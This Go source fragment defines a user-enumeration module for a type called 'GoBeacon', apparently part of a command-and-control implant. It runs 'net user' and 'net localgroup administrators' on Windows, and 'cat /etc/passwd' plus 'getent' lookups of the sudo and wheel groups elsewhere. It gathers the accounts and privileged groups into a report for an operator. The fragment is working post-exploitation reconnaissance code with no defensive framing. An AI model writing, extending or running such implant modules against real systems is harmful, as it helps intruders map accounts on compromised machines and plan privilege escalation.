// User Enumeration module - List system users and groups

func (b *GoBeacon) moduleUserEnum(parameters string) string {
	var result strings.Builder
	result.WriteString("=== USER ENUMERATION ===\n")

	current, err := user.Current()
	if err == nil {
		result.WriteString(fmt.Sprintf("Current User: %s (UID: %s, GID: %s)\n", current.Username, current.Uid, current.Gid))
		result.WriteString(fmt.Sprintf("Home Directory: %s\n", current.HomeDir))
	}

	result.WriteString("\nAll Users:\n")
	if runtime.GOOS == "windows" {
		cmd := exec.Command("net", "user")
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("Error enumerating users: %v\n", err))
		} else {
			result.Write(output)
		}

		result.WriteString("\nAdministrators Group:\n")
		cmd = exec.Command("net", "localgroup", "administrators")
		output, err = cmd.Output()
		if err == nil {
			result.Write(output)
		}
	} else {
		cmd := exec.Command("cat", "/etc/passwd")
		output, err := cmd.Output()
		if err != nil {
			result.WriteString(fmt.Sprintf("Error reading /etc/passwd: %v\n", err))
		} else {
			result.Write(output)
		}

		result.WriteString("\nSudo Users:\n")
		cmd = exec.Command("getent", "group", "sudo")
		output, err = cmd.Output()
		if err == nil {
			result.Write(output)
		}

		cmd = exec.Command("getent", "group", "wheel")
		output, err = cmd.Output()
		if err == nil {
			result.WriteString("Wheel Group:\n")
			result.Write(output)
		}
	}

	return result.String()
}
